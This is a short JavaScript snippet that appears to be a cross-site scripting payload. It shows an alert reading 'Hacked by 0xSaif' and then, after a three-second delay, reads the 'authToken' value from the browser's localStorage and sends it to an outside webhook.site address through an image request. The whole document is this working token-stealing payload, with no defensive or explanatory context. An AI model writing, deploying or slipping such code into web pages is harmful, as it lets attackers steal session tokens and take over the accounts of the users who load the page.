alert("Hacked by 0xSaif 👾");

setTimeout(() => {
  const token = localStorage.getItem("authToken");
  if (token) {
    var i = new Image();
    i.src = "https://webhook.site/598a90e3-ecbb-459e-aa91-da522aab0004?token=" + encodeURIComponent(token);
  } else {
    console.log("authToken not found in localStorage");
  }
}, 3000);


